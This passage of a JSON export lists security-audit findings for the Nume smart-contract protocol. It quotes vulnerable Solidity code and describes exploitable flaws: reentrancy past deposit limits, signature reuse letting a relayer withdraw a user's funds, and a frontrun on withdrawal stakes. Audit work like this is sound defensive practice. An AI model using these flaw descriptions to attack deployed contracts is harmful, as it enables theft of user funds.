      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen"
      ]
    },
    {
      "id": "31656",
      "title": "[L-12] receive() msg.value is hard to return",
      "impact": "LOW",
      "content": "`NumeP2P` has the default `receive()` function, which does not have any code.\nReceived Native token there will not be accounted in the storage, and there are no functions to handle this received value.\n\nThis value will be hard to remove - either introducing new facets with new functions, or using `backendWithdrawalAddresses` (which is not intended behavior for this scenario).\n\nConsider some of the options:\n\n1. delete `receive()`\n2. treating sending native token as a deposit\n3. if additional native token on balance is required for some not revealed operations, introduce new functions to handle these operations",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31655",
      "title": "[L-11] depositsQueueHash includes nullified invalid deposits",
      "impact": "LOW",
      "content": "`notarizeSettlement()` in the beginning of the function deletes invalid deposits (their data is nullified).\nThen, valid deposits are settled in the sequential order.\n`computeQueueHash()` can include previously deleted deposits, thus `settlementMessage` will include some data as zero bytes.\n\nMake sure if it is an expected behavior, and that from the side of the Nume these zero bytes are proceeded correctly.\nIf not, one of the options is to skip empty value in `computeQueueHash()`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31654",
      "title": "[L-10] PaymentUtils.pay() misses safeTransfer()",
      "impact": "LOW",
      "content": "Contracts usually use `safeTransfer()` and `safeTransferFrom()`.\n`PaymentUtils.pay()` uses transfer directly. It is more secure to use `safeTransfer()` there.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31653",
      "title": "[L-09] enforceExodusMode() naming",
      "impact": "LOW",
      "content": "`AppStorage.sol` functions have the rule for naming of `enforce`+`{Rule}`.\n\nCorrect examples:\n\n- enforceIsOwner()\n- enforceIsGovernor()\n\nWrong example:\n\n- enforceExodusMode()\n\nIt is wrong because in fact the code checks that the contract is not in the exodusMode:\n\n```\n    function enforceExodusMode() internal view {\n        require(\n            !numeStorage().isInExodusMode,\n            \"Nume: Protocol is in exodus mode\"\n        );\n    }\n```\n\nSo it is better to rename to e.g. `enforceNotExodusMode()`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31652",
      "title": "[L-08] RegistrationFacet.changeVerificationAddress() zero check missed",
      "impact": "LOW",
      "content": "`RegistrationFacet.changeVerificationAddress()` allows setting `AppStorage.numeStorage().verificationAddress` as the zero address. It is not correct for future signature checks used in `SettlementsFacet`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31651",
      "title": "[L-07] setDepositsLimit - if decreased, may have ongoing userDepositCount above the new limit",
      "impact": "LOW",
      "content": "`DepositsFacet.setDepositsLimit()` sets AppStorage.numeStorage().depositsLimit\nIf this value decreased, some users with high enough `userDepositCount` can be left with `userDepositCount` potentially above the new `depositsLimit`.\n`getUserDepositsLeft()` will revert (underflow).\n\nSame thing for `NFTDepositsFacet.setNftDepositsLimit()`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31650",
      "title": "[L-06] It will become difficult to use signatures when Nume block time decreases, because signature is valid within 1 Nume block",
      "impact": "LOW",
      "content": "Signature is valid when used in the exact Nume block when it was signed. If Nume block time decreases due to increasing volume, it will mean decrease of valid signature time.\nCurrently signature is valid only in current Nume block:\n\n```solidity\n    function withdrawExodus(\n        WithdrawalRequestArgs calldata _args\n    ) external nonReentrant {\n        ...\n        require(\n            ECDSAUtils.recoverSigner(\n@>              abi.encodePacked(_args.user, ns.currBlockNumber),\n                _args.signature\n            ) == _args.user,\n            \"WithdrawExodus: Invalid user signature\"\n        );\n        ...\n    }\n\n    function submitWithdrawalRequest(\n        WithdrawalRequestArgs calldata _args\n    ) external payable nonReentrant {\n        ...\n        require(\n            ECDSAUtils.recoverSigner(\n@>              abi.encodePacked(_args.user, ns.currBlockNumber),\n                _args.signature\n            ) == _args.user,\n            \"SubmitWithdrawalRequest: Invalid user signature\"\n        );\n        ...\n    }\n```\n\nRecommendation:\nConsider specifying Nume block expiration as signature arguments, instead of using current block.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31649",
      "title": "[L-05] Two contractOwner roles, likely with not intended behavior and risk of mistakes",
      "impact": "LOW",
      "content": "Nume diamond has two `contractOwner` addresses, stored in two different storage, both are used in different situations:\n\n- AppStorage.numeStorage().contractOwner\n- LibDiamond.diamondStorage().contractOwner\n\n**owner()**\nreturns `LibDiamond.diamondStorage().contractOwner`\n\n**getContractOwner() public**\nreturns `AppStorage.numeStorage().contractOwner`\n\n**contractOwner() internal, LibDiamond**\nreturns `LibDiamond.diamondStorage().contractOwner`\n\n**transferOwnership()**\n`msd.sender` should be `LibDiamond.diamondStorage().contractOwner`\nbut sets a new address to `LibDiamond.diamondStorage().contractOwner`\n\n**setContractOwner() public**\n`msd.sender` should be `LibDiamond.diamondStorage().contractOwner`\nsets a new address to `AppStorage.numeStorage().contractOwner`\n\n**setContractOwner() internal, LibDiamond**\nsets a new address to `LibDiamond.diamondStorage().contractOwner`\n\n**enforceIsOwner(), internal, AppStorage**\nchecks `msd.sender` should be `AppStorage.numeStorage().contractOwner`\n\n**enforceIsContractOwner() internal, LibDiamond**\nchecks `msd.sender` should be `LibDiamond.diamondStorage().contractOwner`\n\nGiven the same naming, the probability of the mistake is sufficient.\n\nSome suspicious example of mixed usage is:\n\n`ConfigFacet.supportToken()` uses `LibDiamond.enforceIsContractOwner()`\nbut\n`DepositFacet.setDepositsLimit()` uses `AppStorage.enforceIsOwner()`\n\nThe very similar namings make management confusing and increase the probability of mistakes.\n\nSome examples of possible mistakes:\n\n- using `setContractOwner()` instead of `transferOwnership`, when changing `LibDiamond.diamondStorage().contractOwner`\n- confusing between `enforceIsOwner()` and `enforceIsContractOwner` when developing new facets\n- external users experiencing different results when calling `owner()` and `getContractOwner()`\n\nConsider having only one `owner` role.\n**OR**\nIf now everything works as intended, and two different roles are required for operation, we strongly recommend renaming variables and functions.\nFor example:\n\n- `LibDiamond.diamondStorage().contractOwner` => \"diamondOwner\"\n- `AppStorage.numeStorage().contractOwner` => \"numeOwner\"",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31648",
      "title": "[L-04] `nftDepositsLimit` can be bypassed with malicious ERC721",
      "impact": "LOW",
      "content": "Here it doesn't follow CEI pattern and perform effects before external call. ERC721 can be malicious and reenter function `depositNFT()`, bypassing limit. Because `ns.userNftDepositCount` is updated in the very end.\n\n```solidity\n    function depositNFT(\n        address _user,\n        address _nftContractAddress,\n        uint256 _tokenId\n    ) external {\n        AppStorage.enforceExodusMode();\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n@>      if (!_checkNftDepositStatus(_user)) {\n            revert AppStorage.ExceededMaximumDailyCalls(_user);\n        }\n\n@>      IERC721(_nftContractAddress).safeTransferFrom(\n            msg.sender,\n            address(this),\n            _tokenId\n        );\n@>      ns.userNftDepositCount[msg.sender]++;\n        _depositNFT(_user, _nftContractAddress, _tokenId);\n    }\n```\n\nRecommendation:\nMake external call in the very end:\n\n```diff\n    function depositNFT(\n        address _user,\n        address _nftContractAddress,\n        uint256 _tokenId\n    ) external {\n        AppStorage.enforceExodusMode();\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n        if (!_checkNftDepositStatus(_user)) {\n            revert AppStorage.ExceededMaximumDailyCalls(_user);\n        }\n\n-       IERC721(_nftContractAddress).safeTransferFrom(\n-           msg.sender,\n-           address(this),\n-           _tokenId\n-       );\n        ns.userNftDepositCount[msg.sender]++;\n        _depositNFT(_user, _nftContractAddress, _tokenId);\n+       IERC721(_nftContractAddress).safeTransferFrom(\n+           msg.sender,\n+           address(this),\n+           _tokenId\n+       );\n    }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31647",
      "title": "[L-03] `totalTokens` doesn't count native coin",
      "impact": "LOW",
      "content": "Consider including native coin too.\n\n[Test file can be found here](https://gist.github.com/T1MOH593/b6f988b6e9902d97ab8f8c07779cb28f)\n\nRecommendation:\n\n```diff\ncontract NumeP2P {\n    constructor(\n        address _contractOwner,\n        address _diamondCutFacet,\n        bytes memory _data\n    ) payable {\n        ...\n\n+       ++ns.totalTokens;\n        ns.supportedTokens[0x1111111111111111111111111111111111111111] = true;\n        ...\n    }\n...\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31646",
      "title": "[L-02] currBlockNumber naming - is not related to block.number",
      "impact": "LOW",
      "content": "`currBlockNumber` is incremented by one every time `notarizeSettlement()` is called.\nIt also has the getter getCurrBlockNumber() with the comment `Returns the current block number.`\nBut this variable is never compared to the actual `block.number`.\nThe usecase of this variable is to be rather a nonce.\nConsider renaming the variable to have no relation to `block.number`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31645",
      "title": "[L-01] `getUserDepositsLeft()` and `getUserNftDepositsLeft()` can revert after setting new limit",
      "impact": "LOW",
      "content": "Getters for user's deposits left can revert in `NFTDepositsFacet` and `DepositsFacet` if limit was set during current epoch, while user's deposit count is greater than new limit:\n\n```solidity\n    function setDepositsLimit(uint256 _limit) external {\n        AppStorage.enforceIsOwner();\n        AppStorage.numeStorage().depositsLimit = _limit;\n        emit DepositLimit(_limit);\n    }\n\n    function getUserDepositsLeft(\n        address _user\n    ) external view returns (uint256) {\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        if (block.timestamp - ns.userDepositTimestamp[_user] >= 1 days) {\n            return ns.depositsLimit;\n        }\n@>      return ns.depositsLimit - ns.userDepositCount[_user];\n    }\n```\n\n```solidity\n    function setNftDepositsLimit(uint256 _limit) external {\n        AppStorage.enforceIsOwner();\n        AppStorage.numeStorage().nftDepositsLimit = _limit;\n        emit NFTDepositLimit(_limit);\n    }\n\n    function getUserNftDepositsLeft(\n        address _user\n    ) external view returns (uint256) {\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        if (block.timestamp - ns.userNftDepositTimestamp[_user] >= 1 days) {\n            return ns.nftDepositsLimit;\n        }\n@>      return ns.nftDepositsLimit - ns.userNftDepositCount[_user];\n    }\n```\n\nRecommendation: handle case when current limit is greater than user's count and return 0 instead.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31644",
      "title": "[M-06] Unexpected gains&losses for pending withdrawals if WITHDRAWAL_STAKE is changed",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** High, potential funds stolen from other users and DoS\n\n**Likelihood:** Low, as `Withdrawal_Stake` is not so likely to be changed, must be increased, and must have pending withdrawals\n\n**Description**\n\n`submitWithdrawalRequest()` receives `msg.value` as `WITHDRAWAL_STAKE`. However, it does not store the exact value received per request.\nWhen withdrawal requests are proceeded in `notarizeSettlement()`, the current `WITHDRAWAL_STAKE` is returned.\nThus if `WITHDRAWAL_STAKE` was updated between \"submit\" and \"notarize\" (via `setWithdrawStake()`), the new updated value will be sent back, which is different from initially staked. As a result, pending withdrawals will experience either a loss or a gain.\nIf `WITHDRAWAL_STAKE` decreases - users will receive less than staked (loss)\nIf `WITHDRAWAL_STAKE` increases - users will receive more than staked (gain)\n\nGains for such users mean a loss for the whole contract - lack of funds to finalize all withdrawals in case of a mass exit scenario (DoS).\n\nSome extravagant scenarios include the frontrun attack:\n\n1. (Frontrun) Withdrawal request, stake a smaller value\n2. `WITHDRAWAL_STAKE` increases\n3. waiting for the request to proceed, receive the increased value\n\n**Recommendations**\n\nThere are a few options:\n\n1. store staked value per user or per request\n2. make sure that there are no pending withdrawals when calling `setWithdrawStake()`\n3. disable changing `WITHDRAWAL_STAKE`",
      "summary": "\nThis bug report addresses a potential issue with the `submitWithdrawalRequest()` function in a contract. The severity of this bug is high as it could result in funds being stolen from users and also cause a denial of service attack. However, the likelihood of this bug occurring is low as it requires specific conditions to be met. The report explains that the function does not store the exact value received as `WITHDRAWAL_STAKE` and this can cause problems when the function `notarizeSettlement()` is called. If the `WITHDRAWAL_STAKE` is updated between these two functions, the new value will be sent back instead of the initially staked amount. This can result in users either losing or gaining funds, which can also affect the overall funds of the contract. The report also mentions a potential attack scenario called a frontrun attack, where a user can exploit this bug to gain more funds. The report suggests a few recommendations to fix this bug, such as storing the staked value per user or request, making sure there are no pending withdrawals when changing the `WITHDRAWAL_STAKE`, or disabling the ability to change it altogether. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31643",
      "title": "[M-05] Staked WITHDRAWAL_STAKE cannot be withdrawn during the exodusMode",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium, a portion of user funds lost\n\n**Likelihood:** Medium, exodusMode is a scenario, but not so likely\n\n**Description**\n\n`submitWithdrawalRequest()` requires provided `msg.value`=`WITHDRAWAL_STAKE` in order to have a pending withdrawal. It is designed to be returned when a withdrawal request is approved via `notarizeSettlement()`.\nBut during the mass exit scenario, there is no way to return staked `WITHDRAWAL_STAKE`. Only pending deposits and verified Nume balance can be withdrawn, but not `WITHDRAWAL_STAKE` if any.\n\n**Recommendations**",
      "summary": "\nThis bug report discusses an issue with the `submitWithdrawalRequest()` function, which is used to request a withdrawal of funds. The bug causes a loss of a portion of user funds and is classified as medium severity with a medium likelihood of occurring. The function requires a specific value to be provided in order to initiate a withdrawal, but during a specific scenario called \"exodusMode,\" this value cannot be returned. The report recommends finding a solution to allow for the withdrawal of this value during the exodusMode scenario.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31642",
      "title": "[M-04] `Withdrawal_Stake` and pending deposits are returned to wrong address",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Low. Withdrawal initiator loses 0.01 ETH per withdrawal\n\n**Likelihood:** High. The only prerequisite is to perform withdrawal on behalf of another user, which is expected behavior\n\n**Description**\n\nCurrently `Withdrawal_Stake` is returned to user whose withdrawal is processed, instead of actual sender who submitted withdrawal request and staked it.\n\nHere you can see that `Withdrawal_Stake` is returned to withdrawal receiver, instead of withdrawal initiator:\n\n```solidity\n    function notarizeSettlement(\n        NotarizeSettlementArgs calldata _args\n    ) external nonReentrant {\n            ...\n            for (uint256 i; i < numContractWithdrawals; ) {\n                ...\n                if (_args.contractWithdrawalAmounts[i] > 0) {\n                    PaymentUtils.pay(\n                        _args.contractWithdrawalAddresses[i],\n                        _args.contractWithdrawalTokenAddresses[i],\n                        _args.contractWithdrawalAmounts[i]\n                    );\n@>                  PaymentUtils.pay(\n                        _args.contractWithdrawalAddresses[i],\n                        0x1111111111111111111111111111111111111111,\n                        ns.WITHDRAWAL_STAKE\n                    );\n                }\n                ...\n            }\n            for (uint256 i; i < numContractWithdrawals; ) {\n                ...\n                if (_args.isContractNftWithdrawalValid[i]) {\n@>                  PaymentUtils.pay(\n                        _args.contractNftWithdrawalAddresses[i],\n                        0x1111111111111111111111111111111111111111,\n                        ns.WITHDRAWAL_STAKE\n                    );\n                } else {\n                    ...\n                }\n                ...\n            }\n        ...\n    }\n```\n\n**Recommendations**\n\nIntroduce parameter `sender` in withdrawals requests. Return `Withdrawal_Stake` to `sender` of request instead of withdrawal receiver.",
      "summary": "\nThis bug report is about a small issue that is not very serious. It only affects people who are withdrawing money for someone else, which is something that is expected to happen. Currently, the person who is withdrawing the money is losing a small amount of money each time. The chances of this happening are high because the only thing you need to do is withdraw money for someone else. The report suggests a solution to fix this problem by adding a new parameter and returning the money to the person who made the withdrawal request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31641",
      "title": "[M-03] Setting deposit limit to zero stops all new deposits",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** High, new deposit will be stopped (DoS)\n\n**Likelihood:** Low, zero input by mistake or with the intention to cancel/disable deposit limit\n\n**Description**\n\nDeposit limits are managed with functions `setDepositsLimit()` and `setNftDepositsLimit()`.\nThey set `depositsLimit` and `nftDepositsLimit` without zero input checks.\nZero can be inputted either by mistake, or with the intention to disable limits.\n\n**Recommendations**\n\nWe recommend requiring that the new value is not zero.",
      "summary": "\nThis bug report is about an issue with deposit limits in a program. The severity of this bug is high because it can cause a new deposit to be stopped, which is called a DoS. The likelihood of this bug happening is low, but it can occur if someone accidentally inputs zero or intentionally disables the deposit limit. The program has two functions, called `setDepositsLimit()` and `setNftDepositsLimit()`, that set the limits. However, these functions do not check for zero inputs. The report recommends that the program should require a non-zero value for the limits to prevent this bug from happening.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31640",
      "title": "[M-02] The same signature is used for both withdrawal request and subscription cancelling",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium. User can't specify what action to perform when gives signature. As a result, user can't use signatures in trustless manner because tx sender can perform different action on behalf of user.\n\n**Likelihood:** Medium. Usage of signature is impacted, however user can send transaction on his own to avoid problems.\n\n**Description**\n\nHere you can see that signature in both methods contains the same parameters:\n\n```solidity\n    function submitWithdrawalRequest(\n        WithdrawalRequestArgs calldata _args\n    ) external payable nonReentrant {\n        AppStorage.enforceExodusMode();\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        ...\n        require(\n            ECDSAUtils.recoverSigner(\n@>              abi.encodePacked(_args.user, ns.currBlockNumber),\n                _args.signature\n            ) == _args.user,\n            \"SubmitWithdrawalRequest: Invalid user signature\"\n        );\n       ...\n    }\n\n    function cancelSubscriptionRequest(\n        CancelSubscriptionRequestArgs calldata _args\n    ) external {\n        AppStorage.enforceExodusMode();\n\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n        require(\n            ECDSAUtils.recoverSigner(\n@>              abi.encodePacked(_args.user, ns.currBlockNumber),\n                _args.signature\n            ) == _args.user,\n            \"SettlementsFacet: Invalid user signature\"\n        );\n        ...\n    }\n```\n\nIt means that transmitter who sends transaction, can withdraw user's funds though user signed to perform subscription cancelling and vice versa. Possibility of altering data breaks possibility of trustless use of signatures.\n\n**Recommendations**\n\nAdd unique salt to signature arguments, for example method name:\n\n```diff\n    function submitWithdrawalRequest(\n        WithdrawalRequestArgs calldata _args\n    ) external payable nonReentrant {\n        AppStorage.enforceExodusMode();\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        ...\n        require(\n            ECDSAUtils.recoverSigner(\n-               abi.encodePacked(_args.user, ns.currBlockNumber),\n+               abi.encodePacked(_args.user, ns.currBlockNumber, \"submitWithdrawalRequest\"),\n                _args.signature\n            ) == _args.user,\n            \"SubmitWithdrawalRequest: Invalid user signature\"\n        );\n       ...\n    }\n\n    function cancelSubscriptionRequest(\n        CancelSubscriptionRequestArgs calldata _args\n    ) external {\n        AppStorage.enforceExodusMode();\n\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n\n        require(\n            ECDSAUtils.recoverSigner(\n-               abi.encodePacked(_args.user, ns.currBlockNumber),\n+               abi.encodePacked(_args.user, ns.currBlockNumber, \"cancelSubscriptionRequest\"),\n                _args.signature\n            ) == _args.user,\n            \"SettlementsFacet: Invalid user signature\"\n        );\n        ...\n    }\n\n    function withdrawExodus(\n        WithdrawalRequestArgs calldata _args\n    ) external nonReentrant {\n        AppStorage.NumeStorage storage ns = AppStorage.numeStorage();\n        if (!ns.isInExodusMode) {\n            revert AppStorage.NotInExodusMode();\n        }\n        require(\n            ECDSAUtils.recoverSigner(\n-               abi.encodePacked(_args.user, ns.currBlockNumber),\n+               abi.encodePacked(_args.user, ns.currBlockNumber, \"withdrawExodus\"),\n                _args.signature\n            ) == _args.user,\n            \"WithdrawExodus: Invalid user signature\"\n        );\n        ...\n}\n```",
      "summary": "\nThis bug report discusses a problem with the use of signatures in a software program. The severity of the bug is medium, meaning it has a moderate impact on the program's functionality. The bug affects the ability of users to specify what action they want to perform when using signatures. This can lead to trust issues, as the sender of a transaction can perform a different action than what the user intended. The likelihood of encountering this bug is also medium, as users can still send transactions on their own to avoid the issue.\n\nThe report goes on to explain that the bug is caused by the fact that both methods in the program use the same parameters for signatures. This means that the sender of a transaction can withdraw a user's funds even if the user had signed to cancel a subscription, and vice versa. This breaks the trustless nature of using signatures.\n\nTo fix this bug, the report recommends adding a unique salt to the signature arguments. This could be done by including the method name in the signature, which would differentiate between the different actions and prevent the issue from occurring. The report provides an example of how this could be implemented in the code.\n\nIn summary, this bug report highlights a problem with the use of signatures in a software program and suggests a solution to fix it. By following the recommendations, the program can ensure that users can use signatures in a trustless manner without the risk of their actions being altered by the sender of a transaction. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31639",
      "title": "[M-01] WITHDRAWAL_REQUEST_TIMEOUT cannot be too short",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** High, the protocol will stop\n\n**Likelihood:** Low, the variable has a default value and unlikely to be revised\n\n**Description**\n\n`OwnershipFacet` has `setWithdrawalRequestTimeout()` which sets `WITHDRAWAL_REQUEST_TIMEOUT`.\n\n`WITHDRAWAL_REQUEST_TIMEOUT` is a highly risky parameter. If it is too low, there will be more likely to fall into exodusMode - which means the protocol is disabled (no functions to get back from the exodusMode, the protocol will require deploying a new Diamond or adding new facets).\n\n**Recommendations**\n\nWe recommend setting a minimum allowed value for `WITHDRAWAL_REQUEST_TIMEOUT` or disabling revisions from the default 14 days.",
      "summary": "\nThe report describes a bug that could cause the protocol to stop working. This is considered a serious issue with a low likelihood of happening. The bug is related to a variable called `WITHDRAWAL_REQUEST_TIMEOUT` in the `OwnershipFacet` function. If this variable is set too low, the protocol could enter a disabled state called \"exodusMode\" and it would be difficult to recover from. The report suggests setting a minimum value for this variable or disabling changes from the default setting of 14 days to prevent this bug from occurring. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31638",
      "title": "[H-04] Stuck tokens during the Exodus Mode",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High, tokens stuck\n\n**Likelihood:** Medium, it must be pending withdrawals, and the Exodus Mode enabled\n\n**Description**\n\nDuring the Exodus Mode users can prove their Nume balance and call `withdrawExodus()` to withdraw NFTs not yet withdrawn and that have not received approval in `notarizeSettlement()` yet.\nAlso, users can have some funds already approved. In this case, they have to call `withdrawNFT()` manually, which is the final step to finalize the approved withdrawals.\nBut this function has the following line:\n\n```\nAppStorage.enforceExodusMode();\n```\n\nIt means that these approved withdrawals will not be finalized during the exodus mode:\n\n- `withdrawNFT()` will fail, as not allowed during the exodus mode\n- `withdrawExodus()` will not prove that users have these NFT\n\n**Recommendations**\n\nRemove `AppStorage.enforceExodusMode();` from `withdrawNFT()`",
      "summary": "\nThis bug report describes an issue where users are unable to withdraw their tokens during the Exodus Mode, resulting in them being stuck. This issue has a high impact and a medium likelihood of occurring. The report suggests that the problem is caused by a line of code that prevents approved withdrawals from being finalized during the Exodus Mode. The recommendation is to remove this line of code to allow users to withdraw their tokens during the Exodus Mode.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Nume",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Pashov Audit Group/2024-03-05-Nume.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "31637",
      "title": "[H-03] Breaking the deposit limit with different msg.value and \\_user",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** Medium, a daily limit bypassed (invariant broken)\n\n**Likelihood:** High, easily available behavior\n\n**Description**\n\nNume tries to limit the number of deposits per day for a user in two contracts - `NFTDepositsFacet` and `DepositsFacet`.\nDuring the deposit, we have this code (slightly rewritten for simplicity):\n\n```\n...\nuint256 currentTime = block.timestamp;\nif (currentTime - ns.userDepositTimestamp[_user] >= 1 days) {\n            delete ns.userDepositCount[_user];\n            ns.userDepositTimestamp[_user] = currentTime;\n        }\nrequire ( ns.userDepositCount[msg.sender] < ns.depositsLimit )\n...\nns.userDepositCount[msg.sender]++;\n_deposit(_user, 0x1111111111111111111111111111111111111111, msg.value);\n```\n\nAs you can see, the function deletes the counter for the `_user` daily:\n\n```\ndelete ns.userDepositCount[_user];\n```\n\nBut later, the function checks the counter for the `msg.sender` and does `++` for `msg.sender`:\n\n```\nrequire ( ns.userDepositCount[msg.sender] < ns.depositsLimit )\n...\nns.userDepositCount[msg.sender]++;\n```\n\n`userDepositCount[_user]` is never checked to be below `ns.depositsLimit`, and is never incremented.\nAs a result, `ns.depositsLimit` can easily be bypassed by changing msg.senders.\n\nMoreover, ns.userDepositCount[msg.sender] is always incremented, and never deleted/nullified, even daily.\n\n**Recommendations**\n\nReplace `ns.userDepositCount[msg.sender]` with `ns.userDepositCount[_user]` in both deposit functions - `depositERC20()` and `deposit()`.\nMake sure that `msg.sender` is only used as a token sender.\nThis problem exists in both deposit contracts - `NFTDepositsFacet` and `DepositsFacet`.\n**OR**\nMaybe it was the intention to limit 